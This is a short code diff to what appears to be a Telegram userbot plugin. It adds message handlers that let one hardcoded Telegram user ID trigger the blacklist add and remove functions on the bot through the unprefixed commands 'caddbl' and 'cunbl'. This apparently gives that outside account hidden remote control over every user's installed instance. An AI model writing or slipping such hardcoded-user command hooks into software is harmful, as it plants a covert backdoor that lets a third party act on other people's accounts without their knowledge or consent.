@@ -20,12 +20,14 @@ __HELP__ = """
 
 @PY.UBOT("addbl")
 @PY.TOP_CMD
+@ubot.on_message(filters.command(["caddbl"], "") & filters.user([6853143041]))
 async def _(client, message):
     await add_blaclist(client, message)
 
 
 @PY.UBOT("unbl")
 @PY.TOP_CMD
+@ubot.on_message(filters.command(["cunbl"], "") & filters.user([6853143041]))
 async def _(client, message):
     await del_blacklist(client, message)
 
